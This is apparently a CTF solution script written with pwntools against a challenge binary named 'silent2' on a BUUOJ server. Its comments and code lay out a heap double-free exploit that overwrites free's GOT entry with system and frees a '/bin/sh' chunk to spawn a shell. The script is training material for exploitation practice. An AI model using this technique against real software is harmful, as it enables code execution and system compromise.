'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    double free in sub_400AB7

1. size >= 0x80 to bypass size checking
2. double free to overwrite free_got to system_plt
3. write a chunk with "/bin/sh"
4. free it to get shell
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 27148 
filename = "./silent2"
elf = ELF(filename)
# local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so'
# remote_libc= './ubuntu18-libc-2.27-x64.so'
# libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

free_got_addr = elf.got['free']
system_plt_addr = elf.plt['system']
# MG_addr = 0x00000000006020C0

def B():
    gdb.attach(io)
    pause()

def Add(size, content):
    io.sendline(b'1')
    sleep(0.2)
    io.sendline(str(size).encode())
    sleep(0.2)
    io.sendline(content)
    sleep(0.2)

def Del(idx):
    io.sendline(b'2')
    sleep(0.2)
    io.sendline(str(idx).encode())
    sleep(0.2)

def Edit(idx, content):
    io.sendline(b'3')
    sleep(0.2)
    io.sendline(str(idx).encode())
    sleep(0.2)
    io.sendline(content)
    sleep(0.2)

def pwn():
    Add(0x100, b'f' * 0x10)
    Add(0x100, b'/bin/sh\x00')
    Del(0)
    Del(0)
    Add(0x100, p64(free_got_addr) + b'\x00')
    Add(0x100, b'f' * 0x10)
    Add(0x100, p64(system_plt_addr))
    Del(1)


if __name__ == "__main__":
    pwn()
    io.interactive()
